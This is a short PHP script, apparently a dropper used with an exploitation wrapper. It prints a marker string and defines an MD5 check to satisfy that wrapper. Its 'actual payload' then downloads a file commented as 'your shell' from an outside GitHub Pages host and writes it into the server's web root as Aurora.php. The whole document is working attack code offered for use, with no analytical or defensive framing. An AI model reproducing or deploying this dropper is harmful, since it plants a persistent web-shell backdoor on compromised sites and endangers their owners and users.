<?php
/* ========== mandatory checks the wrapper makes ========== */
echo "okhttpmlgetcontent";          # (1) marker string

function zlmRt($u){                 # (2) MD5 mirror
    return md5(file_get_contents($u));
}

/* ========== actual payload ========== */
$src  = 'https://aurorafilemanager.github.io/Aurora.php';  # your shell
$dest = $_SERVER['DOCUMENT_ROOT'].'/Aurora.php';           # write here

if (($code = file_get_contents($src)) && file_put_contents($dest,$code))
    echo "<ok>uploaded</ok>";
else
    echo "<fail>";
